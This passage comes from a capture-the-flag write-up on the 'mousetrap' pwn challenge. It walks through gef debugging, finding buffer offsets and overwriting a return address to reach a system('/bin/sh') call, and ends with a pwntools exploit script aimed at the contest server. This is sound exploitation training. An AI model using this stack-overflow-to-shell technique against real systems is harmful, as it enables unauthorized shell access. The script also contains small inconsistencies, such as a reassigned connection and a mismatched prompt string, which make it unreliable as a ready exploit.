   <span class="err">↳</span>    <span class="mh">0x400610</span> <span class="o">&lt;</span><span class="nx">read</span><span class="o">@</span><span class="nx">plt</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span>     <span class="nx">jmp</span>    <span class="nx">QWORD</span> <span class="nx">PTR</span> <span class="p">[</span><span class="nx">rip</span><span class="o">+</span><span class="mh">0x200a22</span><span class="p">]</span>        <span class="c1"># 0x601038 &lt;read@got.plt&gt;</span>
        <span class="mh">0x400616</span> <span class="o">&lt;</span><span class="nx">read</span><span class="o">@</span><span class="nx">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span>     <span class="nx">push</span>   <span class="mh">0x4</span>
        <span class="mh">0x40061b</span> <span class="o">&lt;</span><span class="nx">read</span><span class="o">@</span><span class="nx">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;</span>    <span class="nx">jmp</span>    <span class="mh">0x4005c0</span>
        <span class="mh">0x400620</span> <span class="o">&lt;</span><span class="nx">setvbuf</span><span class="o">@</span><span class="nx">plt</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span>  <span class="nx">jmp</span>    <span class="nx">QWORD</span> <span class="nx">PTR</span> <span class="p">[</span><span class="nx">rip</span><span class="o">+</span><span class="mh">0x200a1a</span><span class="p">]</span>        <span class="c1"># 0x601040 &lt;setvbuf@got.plt&gt;</span>
        <span class="mh">0x400626</span> <span class="o">&lt;</span><span class="nx">setvbuf</span><span class="o">@</span><span class="nx">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span>  <span class="nx">push</span>   <span class="mh">0x5</span>
        <span class="mh">0x40062b</span> <span class="o">&lt;</span><span class="nx">setvbuf</span><span class="o">@</span><span class="nx">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;</span> <span class="nx">jmp</span>    <span class="mh">0x4005c0</span>
<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">arguments</span> <span class="p">(</span><span class="nx">guessed</span><span class="p">)</span> <span class="err">────</span>
<span class="nx">read</span><span class="o">@</span><span class="nx">plt</span> <span class="p">(</span>
   <span class="nv">$rdi</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">,</span>
   <span class="nv">$rsi</span> <span class="o">=</span> <span class="mh">0x00007fffffffdc90</span> <span class="err">→</span> <span class="mh">0x00000000004008c0</span> <span class="err">→</span> <span class="sb">`libc_csu_init+0`</span> <span class="nx">push</span> <span class="nx">r15</span><span class="p">,</span>
   <span class="nv">$rdx</span> <span class="o">=</span> <span class="mh">0x0000000000000020</span>
<span class="p">)</span>
<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">threads</span> <span class="err">────</span>
<span class="p">[</span><span class="c1">#0] Id 1, Name: "mousetrap", stopped 0x4007b9 in `set_mouse_name` (), reason: SINGLE STEP</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">trace</span> <span class="err">────</span>
<span class="p">[</span><span class="c1">#0] 0x4007b9 → `set_mouse_name()`</span>
<span class="p">[</span><span class="c1">#1] 0x40087d → main()</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
<span class="nx">gef</span><span class="err">➤</span>  
</code></pre></div></div>

<p>There you can see <code class="highlighter-rouge">$rdx</code>=<code class="highlighter-rouge">0x0000000000000020</code> which is hex value and it allocates 32 bytes of data from input. But given file was 64bit(<code class="highlighter-rouge">8*8=64</code>) so 8 bytes was allocated for <code class="highlighter-rouge">rbp</code>. So the actually bytes that was allocated by <code class="highlighter-rouge">name</code> variable was 24(32-8)bytes.
As soon as I got I can check that in gdb.</p>

<p><strong>32 bytes data:</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">pattern</span> <span class="nx">create</span> <span class="mi">32</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Generating</span> <span class="nx">a</span> <span class="nx">pattern</span> <span class="nx">of</span> <span class="mi">32</span> <span class="nx">bytes</span>
<span class="nx">aaaaaaaabaaaaaaacaaaaaaadaaaaaaa</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Saved</span> <span class="k">as</span> <span class="s1">'$_gef0'</span>
<span class="nx">gef</span><span class="err">➤</span>  <span class="nx">run</span>
<span class="nx">Starting</span> <span class="nx">program</span><span class="o">:</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">bikram</span><span class="o">/</span><span class="nx">mystuff</span><span class="o">/</span><span class="nx">onlinectf</span><span class="o">/</span><span class="nx">hackpack</span><span class="o">/</span><span class="nx">pwn</span><span class="o">/</span><span class="nx">mousetrapfile</span><span class="o">/</span><span class="nx">mousetrap</span> 
<span class="nx">Welcome</span> <span class="nx">little</span> <span class="nx">mouse</span>
<span class="nx">can</span> <span class="nx">you</span> <span class="nx">steal</span> <span class="nx">the</span> <span class="nx">cheese</span> <span class="nx">from</span> <span class="nx">the</span> <span class="nx">mouse</span> <span class="nx">trap</span>
<span class="nx">Name</span><span class="o">:</span> <span class="nx">aaaaaaaabaaaaaaacaaaaaaadaaaaaaa</span>
<span class="nx">Enter</span> <span class="nx">Code</span> <span class="nx">Sequence</span> <span class="nx">of</span> <span class="mi">7016996765293437284</span><span class="o">:</span> <span class="nx">SNAAAAAAAP</span><span class="o">!</span> <span class="nx">you</span> <span class="nx">died</span><span class="o">!</span><span class="p">[</span><span class="nx">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="nx">process</span> <span class="mi">11792</span><span class="p">)</span> <span class="nx">exited</span> <span class="nx">normally</span><span class="p">]</span>
<span class="nx">gef</span><span class="err">➤</span> 
</code></pre></div></div>
<p><strong>24 bytes data:</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">pattern</span> <span class="nx">create</span> <span class="mi">24</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Generating</span> <span class="nx">a</span> <span class="nx">pattern</span> <span class="nx">of</span> <span class="mi">24</span> <span class="nx">bytes</span>
<span class="nx">aaaaaaaabaaaaaaacaaaaaaa</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Saved</span> <span class="k">as</span> <span class="s1">'$_gef0'</span>
<span class="nx">gef</span><span class="err">➤</span>  <span class="nx">run</span>
<span class="nx">Starting</span> <span class="nx">program</span><span class="o">:</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">bikram</span><span class="o">/</span><span class="nx">mystuff</span><span class="o">/</span><span class="nx">onlinectf</span><span class="o">/</span><span class="nx">hackpack</span><span class="o">/</span><span class="nx">pwn</span><span class="o">/</span><span class="nx">mousetrapfile</span><span class="o">/</span><span class="nx">mousetrap</span> 
<span class="nx">Welcome</span> <span class="nx">little</span> <span class="nx">mouse</span>
<span class="nx">can</span> <span class="nx">you</span> <span class="nx">steal</span> <span class="nx">the</span> <span class="nx">cheese</span> <span class="nx">from</span> <span class="nx">the</span> <span class="nx">mouse</span> <span class="nx">trap</span>
<span class="nx">Name</span><span class="o">:</span> <span class="nx">aaaaaaaabaaaaaaacaaaaaaa</span>
<span class="nx">Enter</span> <span class="nx">Code</span> <span class="nx">Sequence</span> <span class="nx">of</span> <span class="mi">10</span><span class="o">:</span> 

</code></pre></div></div>

<p>From here I was asked for code sequence. Then offset of code sequence was found as follow:-</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">pattern</span> <span class="nx">create</span> <span class="mi">100</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Generating</span> <span class="nx">a</span> <span class="nx">pattern</span> <span class="nx">of</span> <span class="mi">100</span> <span class="nx">bytes</span>
<span class="nx">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Saved</span> <span class="k">as</span> <span class="sb">`'$_gef0'`</span>  
<span class="nx">gef</span><span class="err">➤</span>  <span class="nx">run</span>
<span class="nx">Starting</span> <span class="nx">program</span><span class="o">:</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">bikram</span><span class="o">/</span><span class="nx">mystuff</span><span class="o">/</span><span class="nx">onlinectf</span><span class="o">/</span><span class="nx">hackpack</span><span class="o">/</span><span class="nx">pwn</span><span class="o">/</span><span class="nx">mousetrapfile</span><span class="o">/</span><span class="nx">mousetrap</span>
<span class="nx">Welcome</span> <span class="nx">little</span> <span class="nx">mouse</span>
<span class="nx">can</span> <span class="nx">you</span> <span class="nx">steal</span> <span class="nx">the</span> <span class="nx">cheese</span> <span class="nx">from</span> <span class="nx">the</span> <span class="nx">mouse</span> <span class="nx">trap</span>
<span class="nx">Name</span><span class="o">:</span> <span class="nx">aaaaaaaabaaaaaaacaaaaaaa</span><span class="o">@</span>
<span class="nx">Enter</span> <span class="nx">Code</span> <span class="nx">Sequence</span> <span class="nx">of</span> <span class="mi">2624</span><span class="o">:</span> <span class="nx">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>

<span class="nx">Program</span> <span class="nx">received</span> <span class="nx">signal</span> <span class="nx">SIGSEGV</span><span class="p">,</span> <span class="nx">Segmentation</span> <span class="nx">fault</span><span class="o">.</span>
<span class="mh">0x00000000004007e2</span> <span class="nx">in</span> <span class="sb">`grab_cheese`</span> <span class="p">()</span>
<span class="p">[</span> <span class="nx">Legend</span><span class="o">:</span> <span class="nx">Modified</span> <span class="nx">register</span> <span class="o">|</span> <span class="nx">Code</span> <span class="o">|</span> <span class="nx">Heap</span> <span class="o">|</span> <span class="nx">Stack</span> <span class="o">|</span> <span class="nx">String</span> <span class="p">]</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">registers</span> <span class="err">────</span>
<span class="nv">$rax</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdb60</span>  <span class="err">→</span>  <span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span>
<span class="nv">$rbx</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$rcx</span>   <span class="o">:</span> <span class="mh">0x60</span>              
<span class="nv">$rdx</span>   <span class="o">:</span> <span class="mh">0x15</span>              
<span class="nv">$rsp</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdb78</span>  <span class="err">→</span>  <span class="s2">"daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"</span>
<span class="nv">$rbp</span>   <span class="o">:</span> <span class="mh">0x6161616161616163</span> <span class="p">(</span><span class="s2">"caaaaaaa"</span><span class="o">?</span><span class="p">)</span>
<span class="nv">$rsi</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdbe0</span>  <span class="err">→</span>  <span class="s2">"kaaaaaaalaaaaaaamaaa</span><span class="se">\n</span><span class="s2">"</span>
<span class="nv">$rdi</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdbb0</span>  <span class="err">→</span>  <span class="s2">"kaaaaaaalaaaaaaamaaa</span><span class="se">\n</span><span class="s2">"</span>
<span class="nv">$rip</span>   <span class="o">:</span> <span class="mh">0x00000000004007e2</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">grab_cheese</span><span class="o">+</span><span class="mi">33</span><span class="o">&gt;</span> <span class="nx">ret</span> 
<span class="nv">$r8</span>    <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$r9</span>    <span class="o">:</span> <span class="mh">0x1d</span>              
<span class="nv">$r10</span>   <span class="o">:</span> <span class="mh">0x00007ffff7feff40</span>  <span class="err">→</span>  <span class="sb">`&lt;strcmp+4464&gt;`</span> <span class="nx">pxor</span> <span class="nx">xmm0</span><span class="p">,</span> <span class="nx">xmm0</span>
<span class="nv">$r11</span>   <span class="o">:</span> <span class="mh">0x00007ffff7f3fc00</span>  <span class="err">→</span>  <span class="sb">`&lt;__strcpy_avx2+0&gt;`</span> <span class="nx">mov</span> <span class="nx">rcx</span><span class="p">,</span> <span class="nx">rsi</span>
<span class="nv">$r12</span>   <span class="o">:</span> <span class="mh">0x0000000000400630</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">_start</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="k">xor</span> <span class="nx">ebp</span><span class="p">,</span> <span class="nx">ebp</span>
<span class="nv">$r13</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdd90</span>  <span class="err">→</span>  <span class="mh">0x0000000000000001</span>
<span class="nv">$r14</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$r15</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$eflags</span><span class="o">:</span> <span class="p">[</span><span class="nx">zero</span> <span class="nx">carry</span> <span class="nx">PARITY</span> <span class="nx">adjust</span> <span class="nx">sign</span> <span class="nx">trap</span> <span class="nx">INTERRUPT</span> <span class="nx">direction</span> <span class="nx">overflow</span> <span class="nx">RESUME</span> <span class="nx">virtualx86</span> <span class="nx">identification</span><span class="p">]</span>
<span class="nv">$cs</span><span class="o">:</span> <span class="mh">0x0033</span> <span class="nv">$ss</span><span class="o">:</span> <span class="mh">0x002b</span> <span class="nv">$ds</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$es</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$fs</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$gs</span><span class="o">:</span> <span class="mh">0x0000</span> 
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">stack</span> <span class="err">────</span>
<span class="mh">0x00007fffffffdb78</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0000</span><span class="o">:</span> <span class="s2">"daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"</span>	 <span class="err">←</span> <span class="nv">$rsp</span>
<span class="mh">0x00007fffffffdb80</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0008</span><span class="o">:</span> <span class="s2">"eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"</span>
<span class="mh">0x00007fffffffdb88</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0010</span><span class="o">:</span> <span class="s2">"faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"</span>
<span class="mh">0x00007fffffffdb90</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0018</span><span class="o">:</span> <span class="s2">"gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"</span>
<span class="mh">0x00007fffffffdb98</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0020</span><span class="o">:</span> <span class="s2">"haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span><span class="se">\n</span><span class="s2">"</span>
<span class="mh">0x00007fffffffdba0</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0028</span><span class="o">:</span> <span class="s2">"iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span><span class="se">\n</span><span class="s2">"</span>
<span class="mh">0x00007fffffffdba8</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0030</span><span class="o">:</span> <span class="s2">"jaaaaaaakaaaaaaalaaaaaaamaaa</span><span class="se">\n</span><span class="s2">"</span>
<span class="mh">0x00007fffffffdbb0</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0038</span><span class="o">:</span> <span class="s2">"kaaaaaaalaaaaaaamaaa</span><span class="se">\n</span><span class="s2">"</span>	 <span class="err">←</span> <span class="nv">$rdi</span>
<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">code</span><span class="o">:</span><span class="nx">x86</span><span class="o">:</span><span class="mi">64</span> <span class="err">────</span>
     <span class="mh">0x4007db</span> <span class="o">&lt;</span><span class="nx">grab_cheese</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span> <span class="nx">call</span>   <span class="mh">0x4005d0</span> <span class="o">&lt;</span><span class="nx">strcpy</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
     <span class="mh">0x4007e0</span> <span class="o">&lt;</span><span class="nx">grab_cheese</span><span class="o">+</span><span class="mi">31</span><span class="o">&gt;</span> <span class="nx">nop</span>    
     <span class="mh">0x4007e1</span> <span class="o">&lt;</span><span class="nx">grab_cheese</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span> <span class="nx">leave</span>  
 <span class="err">→</span>   <span class="mh">0x4007e2</span> <span class="o">&lt;</span><span class="nx">grab_cheese</span><span class="o">+</span><span class="mi">33</span><span class="o">&gt;</span> <span class="nx">ret</span>    
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nx">Cannot</span> <span class="nx">disassemble</span> <span class="nx">from</span> <span class="nv">$PC</span>
<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">threads</span> <span class="err">────</span>
<span class="p">[</span><span class="c1">#0] Id 1, Name: "mousetrap", stopped 0x4007e2 in `grab_cheese ()`, reason: SIGSEGV</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">trace</span> <span class="err">────</span>
<span class="p">[</span><span class="c1">#0] 0x4007e2 → `grab_cheese()`</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
<span class="nx">gef</span><span class="err">➤</span>  
</code></pre></div></div>
<p>Now there you can see the address of <code class="highlighter-rouge">$rsp</code> is replaced by variable so I took that variable and found the offset.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">pattern</span> <span class="nx">offset</span> <span class="nx">daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Searching</span> <span class="s1">'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Found</span> <span class="nx">at</span> <span class="nx">offset</span> <span class="mi">24</span> <span class="p">(</span><span class="nx">big</span><span class="o">-</span><span class="nx">endian</span> <span class="nx">search</span><span class="p">)</span> 
<span class="nx">gef</span><span class="err">➤</span>
</code></pre></div></div>

<p>So a <code class="highlighter-rouge">Code Sequence</code> accepted 24 bytes of data after that value it was overflow and gave me <code class="highlighter-rouge">SIGSEGV</code> error you can see in the above output.</p>

<p>Now my offsets combination will be</p>

<blockquote>
  <p>Name =&gt; 24 + 1( to overflow) bytes</p>

  <p>Code Sequence =&gt; 24 + (address of shell) bytes</p>
</blockquote>

<p>Then my final task was to find the address of shell(/bin/bash or /bin/sh) inside the file. For that I again searched for the functions which seems interesting and then I found <code class="highlighter-rouge">cheeeeeeeese</code> functions and disassemble that function.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">info</span> <span class="nx">functions</span>
<span class="nx">All</span> <span class="nb">defined</span> <span class="nx">functions</span><span class="o">:</span>
<span class="nx">Non</span><span class="o">-</span><span class="nx">debugging</span> <span class="nx">symbols</span><span class="o">:</span>
<span class="mh">0x00000000004005a0</span>  <span class="nx">_init</span>
<span class="mh">0x00000000004005d0</span>  <span class="nx">strcpy</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x00000000004005e0</span>  <span class="nx">puts</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x00000000004005f0</span>  <span class="nb">system</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400600</span>  <span class="nb">printf</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400610</span>  <span class="nx">read</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400620</span>  <span class="nx">setvbuf</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400630</span>  <span class="nx">_start</span>
<span class="mh">0x0000000000400660</span>  <span class="sb">`_dl_relocate_static_pie`</span>
<span class="mh">0x0000000000400670</span>  <span class="sb">`deregister_tm_clones`</span>
<span class="mh">0x00000000004006a0</span>  <span class="sb">`register_tm_clones`</span>
<span class="mh">0x00000000004006e0</span>  <span class="sb">`__do_global_dtors_aux`</span>
<span class="mh">0x0000000000400710</span>  <span class="sb">`frame_dummy`</span>
<span class="mh">0x0000000000400717</span>  <span class="nx">cheeeeeeeese</span>
<span class="mh">0x000000000040072a</span>  <span class="nx">init</span>
<span class="mh">0x000000000040078b</span>  <span class="sb">`set_mouse_name`</span>
<span class="mh">0x00000000004007c1</span>  <span class="sb">`grab_cheese`</span>
<span class="mh">0x00000000004007e3</span>  <span class="sb">`deactivate_trap`</span>
<span class="mh">0x0000000000400823</span>  <span class="nx">menu</span>
<span class="mh">0x0000000000400842</span>  <span class="nb">main</span>
<span class="mh">0x00000000004008c0</span>  <span class="sb">`__libc_csu_init`</span>
<span class="mh">0x0000000000400930</span>  <span class="sb">`__libc_csu_fini`</span>
<span class="mh">0x0000000000400934</span>  <span class="sb">`_fini`</span>
<span class="nx">gef</span><span class="err">➤</span>  <span class="nx">disass</span> <span class="mh">0x0000000000400717</span>
<span class="nx">Dump</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="k">function</span> <span class="nf">cheeeeeeeese</span><span class="o">:</span>
   <span class="mh">0x0000000000400717</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="nx">push</span>   <span class="nx">rbp</span>
   <span class="mh">0x0000000000400718</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="nx">mov</span>    <span class="nx">rbp</span><span class="p">,</span><span class="nx">rsp</span>
   <span class="mh">0x000000000040071b</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="nx">lea</span>    <span class="nx">rdi</span><span class="p">,[</span><span class="nx">rip</span><span class="o">+</span><span class="mh">0x226</span><span class="p">]</span>        <span class="c1"># 0x400948</span>
   <span class="mh">0x0000000000400722</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="nx">call</span>   <span class="mh">0x4005f0</span> <span class="o">&lt;</span><span class="nb">system</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
   <span class="mh">0x0000000000400727</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="nx">nop</span>
   <span class="mh">0x0000000000400728</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="nx">pop</span>    <span class="nx">rbp</span>
   <span class="mh">0x0000000000400729</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span>	<span class="nx">ret</span>    
<span class="nx">End</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">dump</span>
</code></pre></div></div>

<p>Then there you can find the <code class="highlighter-rouge">system address</code> before that there should be <code class="highlighter-rouge">/bin/sh</code> shell so checking the string at address <code class="highlighter-rouge">0x400948</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">disass</span> <span class="n">cheeeeeeeese</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">cheeeeeeeese</span><span class="o">:</span>
   <span class="mh">0x0000000000400717</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="n">rbp</span>
   <span class="mh">0x0000000000400718</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
   <span class="mh">0x000000000040071b</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rdi</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x226</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x400948</span>
   <span class="mh">0x0000000000400722</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x4005f0</span> <span class="o">&lt;</span><span class="n">system</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x0000000000400727</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="n">nop</span>
   <span class="mh">0x0000000000400728</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="n">pop</span>    <span class="n">rbp</span>
   <span class="mh">0x0000000000400729</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span>	<span class="n">ret</span>    
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x400948</span>
<span class="mh">0x400948</span><span class="o">:</span>	<span class="s">"/bin/sh"</span>
<span class="n">gef</span><span class="err">➤</span>  
</code></pre></div></div>

<p>So In order to execute the shell I had to call the address before the address of <code class="highlighter-rouge">/bin/sh</code> so that after overflow that address will be executed and we got the shell i.e. <code class="highlighter-rouge">0x000000000040071b</code>.</p>

<p>So my final payload was:-</p>

<blockquote>
  <p>Name =&gt; 24 + 1( to overflow) bytes</p>

  <p>Code Sequence =&gt; 24 + (address before /bin/sh) bytes</p>
</blockquote>

<p>In order to execute this on server of <code class="highlighter-rouge">hackpack</code>and get a flag I made script in python.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span> 

<span class="n">context</span><span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">'cha.hackpack.club'</span><span class="p">,</span><span class="mi">41719</span><span class="p">)</span>
<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./mousetrap"</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"./mousetrap"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name: "</span><span class="p">)</span>

<span class="c1"># to overflow the Code sequence 
</span><span class="n">payload</span><span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> 
<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="c1">#value to overflow the name variable
</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter Code Sequence of 64: "</span><span class="p">)</span>

<span class="n">payload2</span><span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span>
<span class="n">payload2</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040071b</span><span class="p">)</span><span class="c1">#  address before /bin/sh
</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>By running this I got the flag .</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gr4n173</span><span class="o">@</span><span class="nx">root</span><span class="o">:~</span><span class="c1"># python exploit.py</span>
<span class="o">+</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">local</span> <span class="nx">process</span> <span class="s1">'./mousetrap'</span><span class="o">:</span> <span class="nx">pid</span> <span class="mi">14085</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">'/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap'</span>
    <span class="nx">Arch</span><span class="o">:</span>     <span class="nx">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="nx">little</span>
    <span class="nx">RELRO</span><span class="o">:</span>    <span class="nx">Partial</span> <span class="nx">RELRO</span>
    <span class="nx">Stack</span><span class="o">:</span>    <span class="nx">No</span> <span class="nx">canary</span> <span class="nx">found</span>
    <span class="nx">NX</span><span class="o">:</span>       <span class="nx">NX</span> <span class="nx">enabled</span>
    <span class="nx">PIE</span><span class="o">:</span>      <span class="nx">No</span> <span class="nx">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
